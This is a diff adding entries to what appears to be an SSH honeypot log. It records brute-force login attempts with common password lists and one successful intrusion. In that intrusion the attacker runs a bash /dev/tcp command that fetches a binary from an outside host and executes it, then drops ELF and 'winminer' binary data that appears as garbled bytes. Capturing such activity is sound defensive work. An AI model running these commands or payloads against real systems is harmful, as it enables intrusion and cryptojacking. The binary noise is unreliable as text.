@@ -39162,3 +39162,172 @@
 [6/26/2025 3:38:43 PM] ***REJECTED*** {ip: "80.94.95.112", user: "admin", pass:"nightwish"}
 [6/26/2025 3:38:43 PM] ***REJECTED*** {ip: "80.94.95.112", user: "admin", pass:"munich"}
 [6/26/2025 3:38:44 PM] 80.94.95.112 >>> Disconnected.
+[6/26/2025 4:00:22 PM] Connection attempt from IP: 65.49.1.164...
+[6/26/2025 4:00:26 PM] 65.49.1.164 >>> Disconnected.
+[6/26/2025 4:08:07 PM] Connection attempt from IP: 47.238.133.250...
+[6/26/2025 4:08:08 PM] ***REJECTED*** {ip: "47.238.133.250", user: "root", pass:"123456"}
+[6/26/2025 4:08:09 PM] ***REJECTED*** {ip: "47.238.133.250", user: "root", pass:"password"}
+[6/26/2025 4:08:09 PM] ***REJECTED*** {ip: "47.238.133.250", user: "root", pass:"12345678"}
+[6/26/2025 4:08:10 PM] ***REJECTED*** {ip: "47.238.133.250", user: "root", pass:"12345"}
+[6/26/2025 4:08:10 PM] ***REJECTED*** {ip: "47.238.133.250", user: "root", pass:"1234567"}
+[6/26/2025 4:08:11 PM] ***REJECTED*** {ip: "47.238.133.250", user: "root", pass:"qwerty"}
+[6/26/2025 4:08:16 PM] ***REJECTED*** {ip: "47.238.133.250", user: "root", pass:"abc123"}
+[6/26/2025 4:08:17 PM] ***REJECTED*** {ip: "47.238.133.250", user: "root", pass:"111111"}
+[6/26/2025 4:08:17 PM] ***REJECTED*** {ip: "47.238.133.250", user: "root", pass:"000000"}
+[6/26/2025 4:08:17 PM] ***REJECTED*** {ip: "47.238.133.250", user: "root", pass:"666666"}
+[6/26/2025 4:08:18 PM] ***REJECTED*** {ip: "47.238.133.250", user: "root", pass:"888888"}
+[6/26/2025 4:08:18 PM] ***REJECTED*** {ip: "47.238.133.250", user: "root", pass:"654321"}
+[6/26/2025 4:08:19 PM] ***REJECTED*** {ip: "47.238.133.250", user: "root", pass:"admin"}
+[6/26/2025 4:08:19 PM] ***REJECTED*** {ip: "47.238.133.250", user: "root", pass:"root"}
+[6/26/2025 4:08:20 PM] ***REJECTED*** {ip: "47.238.133.250", user: "root", pass:"root123"}
+[6/26/2025 4:08:20 PM] ***REJECTED*** {ip: "47.238.133.250", user: "root", pass:"toor"}
+[6/26/2025 4:08:21 PM] ***REJECTED*** {ip: "47.238.133.250", user: "root", pass:"toor123"}
+[6/26/2025 4:08:21 PM] ***REJECTED*** {ip: "47.238.133.250", user: "root", pass:"toor@123"}
+[6/26/2025 4:08:22 PM] ***REJECTED*** {ip: "47.238.133.250", user: "root", pass:"P@ssw0rd"}
+[6/26/2025 4:08:22 PM] ***REJECTED*** {ip: "47.238.133.250", user: "root", pass:"p@ssw0rd"}
+[6/26/2025 4:08:22 PM] ***REJECTED*** {ip: "47.238.133.250", user: "root", pass:"pass123"}
+[6/26/2025 4:08:23 PM] ***REJECTED*** {ip: "47.238.133.250", user: "root", pass:"password123"}
+[6/26/2025 4:08:23 PM] ***REJECTED*** {ip: "47.238.133.250", user: "root", pass:"passw0rd"}
+[6/26/2025 4:08:24 PM] ***REJECTED*** {ip: "47.238.133.250", user: "root", pass:"123123"}
+[6/26/2025 4:08:24 PM] ***REJECTED*** {ip: "47.238.133.250", user: "root", pass:"123321"}
+[6/26/2025 4:08:25 PM] ***REJECTED*** {ip: "47.238.133.250", user: "root", pass:"1234567890"}
+[6/26/2025 4:08:25 PM] ***REJECTED*** {ip: "47.238.133.250", user: "root", pass:"123456789"}
+[6/26/2025 4:08:26 PM] ***REJECTED*** {ip: "47.238.133.250", user: "root", pass:"a123456"}
+[6/26/2025 4:08:26 PM] ***REJECTED*** {ip: "47.238.133.250", user: "root", pass:"123456a"}
+[6/26/2025 4:08:27 PM] ***REJECTED*** {ip: "47.238.133.250", user: "root", pass:"11111111"}
+[6/26/2025 4:08:27 PM] ***REJECTED*** {ip: "47.238.133.250", user: "root", pass:"88888888"}
+[6/26/2025 4:08:28 PM] ***REJECTED*** {ip: "47.238.133.250", user: "root", pass:"asd123"}
+[6/26/2025 4:08:28 PM] ***REJECTED*** {ip: "47.238.133.250", user: "root", pass:"112233"}
+[6/26/2025 4:08:29 PM] ***REJECTED*** {ip: "47.238.133.250", user: "root", pass:"123456abc"}
+[6/26/2025 4:08:29 PM] ***REJECTED*** {ip: "47.238.133.250", user: "root", pass:"100200"}
+[6/26/2025 4:08:30 PM] ***REJECTED*** {ip: "47.238.133.250", user: "root", pass:"147258369"}
+[6/26/2025 4:08:30 PM] ***REJECTED*** {ip: "47.238.133.250", user: "root", pass:"qq123456"}
+[6/26/2025 4:08:31 PM] ***REJECTED*** {ip: "47.238.133.250", user: "root", pass:"123654"}
+[6/26/2025 4:08:31 PM] ***REJECTED*** {ip: "47.238.133.250", user: "root", pass:"147258"}
+[6/26/2025 4:08:31 PM] ***REJECTED*** {ip: "47.238.133.250", user: "root", pass:"123123123"}
+[6/26/2025 4:08:32 PM] ***REJECTED*** {ip: "47.238.133.250", user: "root", pass:"abc123456"}
+[6/26/2025 4:08:32 PM] ***REJECTED*** {ip: "47.238.133.250", user: "root", pass:"aa123456"}
+[6/26/2025 4:08:33 PM] ***REJECTED*** {ip: "47.238.133.250", user: "root", pass:"121212"}
+[6/26/2025 4:08:33 PM] ***REJECTED*** {ip: "47.238.133.250", user: "root", pass:"222222"}
+[6/26/2025 4:08:34 PM] ***REJECTED*** {ip: "47.238.133.250", user: "root", pass:"123qwe"}
+[6/26/2025 4:08:34 PM] ***REJECTED*** {ip: "47.238.133.250", user: "root", pass:"336699"}
+[6/26/2025 4:08:35 PM] ***REJECTED*** {ip: "47.238.133.250", user: "root", pass:"00000000"}
+[6/26/2025 4:08:35 PM] ***REJECTED*** {ip: "47.238.133.250", user: "root", pass:"a123456789"}
+[6/26/2025 4:08:36 PM] ***REJECTED*** {ip: "47.238.133.250", user: "root", pass:"a111111"}
+[6/26/2025 4:08:36 PM] ***REJECTED*** {ip: "47.238.133.250", user: "root", pass:"778899"}
+[6/26/2025 4:08:37 PM] ***REJECTED*** {ip: "47.238.133.250", user: "root", pass:"zxcvbnm"}
+[6/26/2025 4:08:37 PM] ***REJECTED*** {ip: "47.238.133.250", user: "root", pass:"asdfgh"}
+[6/26/2025 4:08:38 PM] ***REJECTED*** {ip: "47.238.133.250", user: "root", pass:"zxcvbn"}
+[6/26/2025 4:08:38 PM] ***REJECTED*** {ip: "47.238.133.250", user: "root", pass:"1qaz2wsx"}
+[6/26/2025 4:08:38 PM] ***REJECTED*** {ip: "47.238.133.250", user: "root", pass:"qazwsx"}
+[6/26/2025 4:08:39 PM] ***REJECTED*** {ip: "47.238.133.250", user: "root", pass:"test"}
+[6/26/2025 4:08:39 PM] ***REJECTED*** {ip: "47.238.133.250", user: "root", pass:"Aa123456"}
+[6/26/2025 4:08:40 PM] ***REJECTED*** {ip: "47.238.133.250", user: "root", pass:"1qaz@WSX"}
+[6/26/2025 4:08:40 PM] ***REJECTED*** {ip: "47.238.133.250", user: "root", pass:"Root1234"}
+[6/26/2025 4:08:41 PM] ***REJECTED*** {ip: "47.238.133.250", user: "root", pass:"admin123"}
+[6/26/2025 4:08:41 PM] ***REJECTED*** {ip: "47.238.133.250", user: "root", pass:"Admin123"}
+[6/26/2025 4:08:42 PM] ***REJECTED*** {ip: "47.238.133.250", user: "root", pass:"Password1"}
+[6/26/2025 4:08:42 PM] ***REJECTED*** {ip: "47.238.133.250", user: "root", pass:"test123"}
+[6/26/2025 4:08:43 PM] ***REJECTED*** {ip: "47.238.133.250", user: "root", pass:"root777"}
+[6/26/2025 4:08:43 PM] ***REJECTED*** {ip: "47.238.133.250", user: "root", pass:"root666"}
+[6/26/2025 4:08:43 PM] ***REJECTED*** {ip: "47.238.133.250", user: "root", pass:"root321"}
+[6/26/2025 4:08:44 PM] ***REJECTED*** {ip: "47.238.133.250", user: "root", pass:"root2023"}
+[6/26/2025 4:08:44 PM] ***REJECTED*** {ip: "47.238.133.250", user: "root", pass:"root2022"}
+[6/26/2025 4:08:45 PM] ***REJECTED*** {ip: "47.238.133.250", user: "root", pass:"root123456"}
+[6/26/2025 4:08:45 PM] ***REJECTED*** {ip: "47.238.133.250", user: "root", pass:"root1234"}
+[6/26/2025 4:08:46 PM] ***REJECTED*** {ip: "47.238.133.250", user: "root", pass:"root1"}
+[6/26/2025 4:08:46 PM] ***REJECTED*** {ip: "47.238.133.250", user: "root", pass:"qweqwe"}
+[6/26/2025 4:08:47 PM] ***REJECTED*** {ip: "47.238.133.250", user: "root", pass:"Test1234"}
+[6/26/2025 4:08:47 PM] ***REJECTED*** {ip: "47.238.133.250", user: "root", pass:"Root2023"}
+[6/26/2025 4:08:48 PM] ***REJECTED*** {ip: "47.238.133.250", user: "root", pass:"Root2022"}
+[6/26/2025 4:08:48 PM] ***REJECTED*** {ip: "47.238.133.250", user: "root", pass:"Root123456"}
+[6/26/2025 4:08:48 PM] ***REJECTED*** {ip: "47.238.133.250", user: "root", pass:"Root123"}
+[6/26/2025 4:08:49 PM] ***REJECTED*** {ip: "47.238.133.250", user: "root", pass:"Root1"}
+[6/26/2025 4:08:49 PM] ***REJECTED*** {ip: "47.238.133.250", user: "root", pass:"Admin1234"}
+[6/26/2025 4:08:50 PM] ***REJECTED*** {ip: "47.238.133.250", user: "root", pass:"1q2w3e4r5t"}
+[6/26/2025 4:08:50 PM] ***REJECTED*** {ip: "47.238.133.250", user: "root", pass:"guest"}
+[6/26/2025 4:08:56 PM] ***REJECTED*** {ip: "47.238.133.250", user: "root", pass:"Root777"}
+[6/26/2025 4:08:56 PM] ***REJECTED*** {ip: "47.238.133.250", user: "root", pass:"Root666"}
+[6/26/2025 4:08:57 PM] ***REJECTED*** {ip: "47.238.133.250", user: "root", pass:"Password123"}
+[6/26/2025 4:08:57 PM] ***REJECTED*** {ip: "47.238.133.250", user: "root", pass:"Admin@123"}
+[6/26/2025 4:08:57 PM] ***REJECTED*** {ip: "47.238.133.250", user: "root", pass:"administrator"}
+[6/26/2025 4:08:58 PM] ***REJECTED*** {ip: "47.238.133.250", user: "root", pass:"default"}
+[6/26/2025 4:08:58 PM] ***REJECTED*** {ip: "47.238.133.250", user: "root", pass:"!QAZ@WSX"}
+[6/26/2025 4:08:59 PM] ***REJECTED*** {ip: "47.238.133.250", user: "root", pass:"zxc123"}
+[6/26/2025 4:08:59 PM] ***REJECTED*** {ip: "47.238.133.250", user: "root", pass:"rootroot"}
+[6/26/2025 4:09:00 PM] ***REJECTED*** {ip: "47.238.133.250", user: "root", pass:"qweqwe123"}
+[6/26/2025 4:09:00 PM] ***REJECTED*** {ip: "47.238.133.250", user: "root", pass:"abcd1234"}
+[6/26/2025 4:09:01 PM] ***REJECTED*** {ip: "47.238.133.250", user: "root", pass:"P@55w0rd!"}
+[6/26/2025 4:09:01 PM] ***REJECTED*** {ip: "47.238.133.250", user: "root", pass:"asdf123"}
+[6/26/2025 4:09:02 PM] ***REJECTED*** {ip: "47.238.133.250", user: "root", pass:"system"}
+[6/26/2025 4:09:02 PM] ***REJECTED*** {ip: "47.238.133.250", user: "root", pass:"sysadmin"}
+[6/26/2025 4:09:03 PM] ***REJECTED*** {ip: "47.238.133.250", user: "root", pass:"sys"}
+[6/26/2025 4:09:03 PM] ***REJECTED*** {ip: "47.238.133.250", user: "root", pass:"super"}
+[6/26/2025 4:09:04 PM] ***REJECTED*** {ip: "47.238.133.250", user: "root", pass:"root@123"}
+[6/26/2025 4:09:04 PM] ***REJECTED*** {ip: "47.238.133.250", user: "root", pass:"qwe123"}
+[6/26/2025 4:09:04 PM] ***REJECTED*** {ip: "47.238.133.250", user: "root", pass:"passwd"}
+[6/26/2025 4:09:05 PM] ***REJECTED*** {ip: "47.238.133.250", user: "root", pass:"devops"}
+[6/26/2025 4:09:05 PM] ***REJECTED*** {ip: "47.238.133.250", user: "root", pass:"centos"}
+[6/26/2025 4:09:06 PM] ***REJECTED*** {ip: "47.238.133.250", user: "root", pass:"asdqwe"}
+[6/26/2025 4:09:06 PM] ***REJECTED*** {ip: "47.238.133.250", user: "root", pass:"alpine"}
+[6/26/2025 4:09:07 PM] ***REJECTED*** {ip: "47.238.133.250", user: "root", pass:"adminpass"}
+[6/26/2025 4:09:07 PM] ***REJECTED*** {ip: "47.238.133.250", user: "root", pass:"admin1234"}
+[6/26/2025 4:09:08 PM] ***REJECTED*** {ip: "47.238.133.250", user: "root", pass:"admin01"}
+[6/26/2025 4:09:08 PM] Connection attempt from IP: 80.94.95.15...
+[6/26/2025 4:09:08 PM] ***REJECTED*** {ip: "47.238.133.250", user: "root", pass:"admin!@#"}
+[6/26/2025 4:09:09 PM] ***REJECTED*** {ip: "47.238.133.250", user: "root", pass:"Q1w2e3r4"}
+[6/26/2025 4:09:09 PM] ***REJECTED*** {ip: "47.238.133.250", user: "root", pass:"Aa123456@"}
+[6/26/2025 4:09:10 PM] ***REJECTED*** {ip: "47.238.133.250", user: "root", pass:"Aa123456."}
+[6/26/2025 4:09:10 PM] ***REJECTED*** {ip: "80.94.95.15", user: "root", pass:"nitram"}
+[6/26/2025 4:09:10 PM] ***REJECTED*** {ip: "47.238.133.250", user: "root", pass:"@#$%^&"}
+[6/26/2025 4:09:10 PM] ***REJECTED*** {ip: "80.94.95.15", user: "root", pass:"nickel"}
+[6/26/2025 4:09:11 PM] ***REJECTED*** {ip: "47.238.133.250", user: "root", pass:"2wsx#EDC"}
+[6/26/2025 4:09:11 PM] ***REJECTED*** {ip: "80.94.95.15", user: "root", pass:"napster"}
+[6/26/2025 4:09:11 PM] ***REJECTED*** {ip: "47.238.133.250", user: "root", pass:"1q2w3e4r"}
+[6/26/2025 4:09:11 PM] ***REJECTED*** {ip: "80.94.95.15", user: "root", pass:"lord"}
+[6/26/2025 4:09:11 PM] ***REJECTED*** {ip: "47.238.133.250", user: "root", pass:"1q2w3e"}
+[6/26/2025 4:09:12 PM] ***ACCEPTED*** {ip: "80.94.95.15", user: "root", pass:"jewels"}
+[6/26/2025 4:09:12 PM] ***REJECTED*** {ip: "47.238.133.250", user: "root", pass:"3.1415926"}
+[6/26/2025 4:09:12 PM] ***REJECTED*** {ip: "47.238.133.250", user: "root", pass:"!QAZ2wsx#EDC"}
+[6/26/2025 4:09:12 PM] 80.94.95.15 >>> Disconnected.
+[6/26/2025 4:09:13 PM] ***REJECTED*** {ip: "47.238.133.250", user: "root", pass:"qwertyuiop"}
+[6/26/2025 4:09:13 PM] ***REJECTED*** {ip: "47.238.133.250", user: "root", pass:"password@123"}
+[6/26/2025 4:09:14 PM] ***REJECTED*** {ip: "47.238.133.250", user: "root", pass:"password@#"}
+[6/26/2025 4:09:14 PM] ***REJECTED*** {ip: "47.238.133.250", user: "root", pass:"p@ssword"}
+[6/26/2025 4:09:15 PM] ***REJECTED*** {ip: "47.238.133.250", user: "root", pass:"admin@123"}
+[6/26/2025 4:09:15 PM] ***REJECTED*** {ip: "47.238.133.250", user: "root", pass:"abc.123"}
+[6/26/2025 4:09:16 PM] ***REJECTED*** {ip: "47.238.133.250", user: "root", pass:"aB123456"}
+[6/26/2025 4:09:16 PM] ***REJECTED*** {ip: "47.238.133.250", user: "root", pass:"0"}
+[6/26/2025 4:09:17 PM] ***REJECTED*** {ip: "47.238.133.250", user: "root", pass:"1"}
+[6/26/2025 4:09:17 PM] 47.238.133.250 >>> Disconnected.
+[6/26/2025 4:09:17 PM] Connection attempt from IP: 47.238.133.250...
+[6/26/2025 4:09:19 PM] ***REJECTED*** {ip: "47.238.133.250", user: "dev", pass:"123456"}
+[6/26/2025 4:09:19 PM] ***REJECTED*** {ip: "47.238.133.250", user: "dev", pass:"password"}
+[6/26/2025 4:09:20 PM] ***REJECTED*** {ip: "47.238.133.250", user: "dev", pass:"dev"}
+[6/26/2025 4:09:20 PM] ***ACCEPTED*** {ip: "47.238.133.250", user: "dev", pass:"devops"}
+[6/26/2025 4:09:21 PM] 47.238.133.250|dev submitted command: nohup bash -c "exec 6<>/dev/tcp/47.84.40.30/60133 && echo -n 'GET /linux' >&6 && cat 0<&6 > /tmp/CfgGrWqN8h && chmod +x /tmp/CfgGrWqN8h && /tmp/CfgGrWqN8h KVCenDWUnlcvLEuBmDiXhlUsLFyQmTeDgVUtM1eBnS6fg1UnK1WBmTaNhFIzL1aJgzKZhUssKFaKmzCcgFY9KVKenzOUnlczK1GKmzCchFI9JUuCnDiDgV0pM1OClzadgVQoPV2enzKfnlQuL0uBmTiXhlUsLlaQmTeDiFEzKVWenjCXhlUsLlaQmTeDh1MzLFSFgzGag18rLVSAmyCZh0svKVaenzSfnlQlLV+GnTGZhUUpKkuCnjeDiFQzLleKmzCcg1M9KVKenzOVnlQuLkuCmDCXhlUsLVTv+dLDrG5inPIJ" &dd bs=1 count=1911588 > /tmp/JLnWHjjGOELF>pMl@@8'O0O0O6(6(Q�td��?�UPX!��^J%}&p�� ELF>6����@/�XJ'8��ƾW3���|�mKo�.��|�%}&o䩝��`+4-�o���'����oX��w>9�GJW6�p�j�p�$ɻo'oOȑn��P�t䩝�doLn?l�`����Qn�Ű܎�R�!�=X��%I�$@�h����y�GNUæ~e?~�Phc��b��8���4�O�'��FP8�y!16�._���7�]0<�.��B���2�BN�1�y!'2��@��� �(�_��2@/�'%_9��P�h����&�x�D�^l䅍�_V,6�BF��ȿ�BN.����3m�/3?�n�/_(2�B��@�9���EP`h^���Cx@�2�BF�I��������Bd䅌Ȁ����N.���N&��?/y��@H_�5X������po!9�_��?2�b������b'$�_)%b'r�6������`Bȉ^,/J(�8�d�bH/���hy!#/�5�����"�N�/�B._�&�*�Mp����/v2�����Y /��f/y��H_hBF^�`�p�/��b�O�$�rr!n��<�؊�_��]l�_�/����_(!8�9��Pa���\�`�xN.d�����/��Br�kLy!#����&�������N/T_0�BF^e�@�M�!#/dX��h�y0N�����\Ȑ&�_9���=�D�0������f���/@���],�@�U/���0��@/F^�v��X_VTp@N�BI����Z��/���/��/��_�y!#��2�@>�����!�;/��_(�y�38����\�P�`N.d䀖xو2�B`���y!'�@�ȼ���� �W�XB�/4�ryb/#�%(
+[6/26/2025 4:09:22 PM] 47.238.133.250|dev submitted command: �2!O.l�p!'r(t@'rrxX|prr!���rr!'���r!'�А�'r���9���9��0�H9����`�x��������9����9��ؼ�<�����\��� �8\�Ʌ�P��Ʌ�hԀɅ�\ؘ܅�\Ȱ�Ȝ\������&�Ʌ�����BN(�@�BN.�X�!#/�p��'rr�rr!�yr!'�������90 H�9�$`(9��x,�9���0�4����8�<ȓ9��Ʌ�LD H��\�8LP�\��PhT�\�ɅX�\�Ʌ��`�Ʌ�\d�hB�\��l�N.�dp(t@.��BxX|��BNp���BN.���BN.丌Ј.������Ll�/��\�ɜ0�H\�Ʌ�`��Ʌ�x��Ʌ�\�����\���؞\�ɼ��.�dB� ���BN8�P�BN.�h�BN.�ؘN.��ܰ��.��B�����BN���r!'�(�!'r@�Xrr�pА��/���9�9����Lȓ�\�Ʌ0 �Ʌ�H$`Ʌ�\(x,��\Ȑ0��\��4�8�\�Ʌ<�@�dB�D �BN.H8LBN.�PPhN.��T�X�.��B\�`��BN�d��BN.h�l!'��p('rrt@xXrr!|p�rr!'���r!'���!'rА�yr�ʘ9���09����H�`����x���9����9����9��ؼ�Lȓ�� \�Ʌ�8��Ʌ�P�hɅ�\Ԁ؅�\Șܰ�\������\�Ʌ����dB���(�BN.�@�BN.�X�p'2����rr�rr!'�虐'���90�9� H$9��`(x9���,�0����4�8��9�<�Ʉ<��D��\� H8u��֠�/��\l���L�����/P�T��9�Xȓ9�\�`�<���dϜ\��h(l@\�ɅpXt�Ʌ�px�Ʌ�\|����\ȸ�Л\�Ɉ�`r21/��rr!'0�Hr!'�`�!'rx��'rr����rr!�شyr!'ѹ��� ���98�P�9��h�9���И9���԰�ȹ�����ȓ9���Ʌ�L�(셜\�@�X�\���p��^�Ʌ�����BF���BN�!'��'rr0Hrr!` rr!'x$�r!'(�,!'r�0�'rr4�9���< 9���@8DP���HhL��9�P��9�T�X9���\�<���`�d�\�Ʉh(l�Ʌ�@pXɅ�\tpx��\Ȉ|��\�ɀ���\�Ʌ���dB�֐�BN.�0�BN.�H�`N.��x��.��B�����BN����BN.��!'׼ 'rr�8�Prr!�h�rr!'�Иr!'԰�!'r���'rr���9����(9����@�X����p���9���Ʌ������\��N&���.��B0��BNH`�BN. x$BN.�(�N.��,�0�.��B4�8r2!�< r!'@8D!'rPHh'rrL�P�rr!T�Xrr!'�\�r!'`�d��y�h(�9�l@p9��Xtp9���x�|���������9Ј�2�!����/�!'r�0'rr�H�`rr!�x�rr!'���r!'���!'rش�yrݼ9�� �89����P�h���̀А�9�԰�9����9������Lȓ���(\�Ʌ�@��Ʌ�X�pɅ�\���d�XȠ�/��BN.!O.���'r20rr!Hrr!'` xr!'$�(!'r�,�'rr0�4�yr!�9���< @8���DPH��9hL��9�P�T9���X�9���\�`�Lȓd�h�Ʌ�(l@Ʌ�\pXt��\�px��\��|���\�Ʌ�Ј�Ʌ����BN&��BN.�0�HN.��`�x.��B�����BN����BN.�ش!O.��'r2� �8rr!�P�rr!'h̀r!'И�!'r���'rr����yr!��9����(�@����X���9p���9������\ȸО\���.�dB��BN0H�BN.` BN.�x$�N.��(�,�.��B0�4��BN��r!'< @!'r8DP'rrHhL�rr!P�Trr!'�X�r!'\�`�'r�d�9�h(l9��@pX9���tpx����|����9��Г9���BN&f0/�N.��0�H.��B�`���BNx���BN.���BN.����O.���r2!� �rr!'8�Pr!'�h�!'r�И'rr԰��rr!���Ct!'����.�db/�(���BN@�X�BN.�p�BN.���'2����rr�9��'����0��9H`�9� x$9���(�9���,�0ع��4�8�Ʉ�< Ʌ�\@8D��\�PHh�\��L�P�\�ɅT�X�Ʌ��\�Ʌ�\`�dBN&��h(N.��l@pX.��Btpx��BN�|��BN.���BN.�Ј�'���rr!�0�rr!'H�`r!'�x�!'r���'rr����rr!��9��� ����8Đ�9P�h�9�̀�9���԰9������๐�����Ʉ<��(Ʌ�\�@���\�X�p�\������.d�����BN�2!O.�!'r0'rrH`rr! x$rr!'�(�r!',�0!'r�4�yr�<9�� @89���DPHh���L�P��9�T��9�X�\9���`��Lȓd�h(\�Ʌl@p�Ʌ�XtpɅ�\x�|��\Ƞ���\�ɄЈ�
+[6/26/2025 4:09:22 PM] 47.238.133.250|dev submitted command: Y`|<L�N"��aj;�ZGa&��P3�ngG6�����m�h�X���U�pL��(|{������aN�AjO6}��B�X4���g �����
+[6/26/2025 4:09:28 PM] 47.238.133.250|dev submitted command: ��D=ο(��r��쌴����ۼU+�t#�i����L;-�H�"�~���L7CM�@�L�^�ܧJ�zӰ�w���=�9�t �I��:���<�J�خ��/_9�ml�?�E���)�t��0���3��M"�S,M%��R�aӿ��`�2}�2�m�˞�<�Y�����,����`�A:g�+y��)�(�4|�{�TDD�eM.TO>d
+[6/26/2025 4:09:29 PM] 47.238.133.250|dev submitted command: �A�\V�;��D��eC9}0�=�tm��Z�&��]Vn���lG2]8���&���J��SF߾1�t ݡ-��:�o@mF�U�ڍN&��n|:��/|P��;��>3�M���t���C2�u�=P2��|]�SϏ��il�ᙎ]�i\[��O$"�� �8]b��n�.��ҦD�aJ��Ѯ^��А�d�)���:�>c��ܠ����L���R,�8�'"�營�Ap`���@�
+[6/26/2025 4:09:34 PM] 47.238.133.250|dev submitted command: ���<����.-3:�^KO,��8\@�g�Nd��n�&`��l��J�tw�]%O�p�Nx<�5H�&�?Y��@��4Ҝ��J0yFU�hM�T�%�Y�X/��\�<���E�xQ$�^0�.M��\������
+[6/26/2025 4:09:36 PM] 47.238.133.250|dev submitted command: dd bs=1 count=3068416 > /tmp/winminerMZ����@����!�L�!This program cannot be run in DOS mode.
+[6/26/2025 4:09:41 PM] 47.238.133.250|dev submitted command: �}'X�o�$��1�!Z��p�<�osU,|���H���4���ԏr��I��kmb�2
+[6/26/2025 4:09:47 PM] 47.238.133.250|dev submitted command: �ѩ�[w\<0�W�B$$��o���X�@�ͣH�iB�.��A�����t@E?W�T��T�u:�jC�*!����-�J��o���8ͷJ���WX^���s��\�����ĚUJ+�T>�Dđ��ת�ǵ^�{��4��������<�ifTK�z�MY��ex"y������d��V����/���9
+[6/26/2025 4:12:55 PM] Connection attempt from IP: 80.94.95.112...
+[6/26/2025 4:12:56 PM] ***REJECTED*** {ip: "80.94.95.112", user: "admin", pass:"morales"}
+[6/26/2025 4:12:57 PM] ***REJECTED*** {ip: "80.94.95.112", user: "admin", pass:"mone"}
+[6/26/2025 4:12:57 PM] ***REJECTED*** {ip: "80.94.95.112", user: "admin", pass:"mohawk"}
+[6/26/2025 4:12:57 PM] ***REJECTED*** {ip: "80.94.95.112", user: "admin", pass:"merlin1"}
+[6/26/2025 4:12:58 PM] ***REJECTED*** {ip: "80.94.95.112", user: "admin", pass:"mega"}
+[6/26/2025 4:12:58 PM] 80.94.95.112 >>> Disconnected.
+[6/26/2025 4:14:55 PM] Connection attempt from IP: 45.146.130.113...
+[6/26/2025 4:14:56 PM] ***REJECTED*** {ip: "45.146.130.113", user: "maint", pass:"password"}
+[6/26/2025 4:14:56 PM] ***REJECTED*** {ip: "45.146.130.113", user: "maint", pass:"maint1"}
+[6/26/2025 4:14:56 PM] ***REJECTED*** {ip: "45.146.130.113", user: "maint", pass:"maint123"}
+[6/26/2025 4:14:56 PM] ***REJECTED*** {ip: "45.146.130.113", user: "maint", pass:"maint1234"}
+[6/26/2025 4:14:57 PM] ***REJECTED*** {ip: "45.146.130.113", user: "maint", pass:"maint12345"}
+[6/26/2025 4:14:57 PM] 45.146.130.113 >>> Disconnected.
+[6/26/2025 4:21:29 PM] Connection attempt from IP: 109.122.241.110...
+[6/26/2025 4:21:37 PM] 109.122.241.110 >>> Disconnected.
+[6/26/2025 4:25:03 PM] 47.238.133.250 >>> Disconnected.
